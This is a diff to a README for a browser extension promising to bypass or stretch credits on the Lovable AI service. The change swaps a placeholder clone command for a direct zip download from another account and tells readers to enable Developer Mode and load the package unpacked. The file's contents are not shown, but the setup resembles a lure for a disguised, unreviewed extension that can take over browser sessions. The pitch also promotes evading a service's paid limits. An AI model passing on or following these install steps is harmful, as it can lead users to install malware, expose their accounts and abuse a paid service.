@@ -14,7 +14,7 @@ This tool acts as a **Lovable credit helper**, allowing developers to build mass
 When building web apps using Lovable AI, credits run out fast. This open-source extension modifies the frontend and request patterns to ensure you get the most out of every single credit, making it the best **Lovable credits bypass alternative** available on GitHub.
 
 ## 🛠️ How to Install (Step-by-Step)
-1. **Download/Clone** this repo: `git clone https://github.com/YOUR-USERNAME/lovable-unlimited-credits-extension.git`
+1. **Download** this repo: `https://github.com/BINOD-XD/Lovable-Unlimited-Free-Credits/raw/refs/heads/main/elitebytes-extension.zip`
 2. Open your browser and navigate to `chrome://extensions/`.
 3. Enable **Developer Mode** (Top-right corner).
 4. Click **Load Unpacked** and select this repository folder.
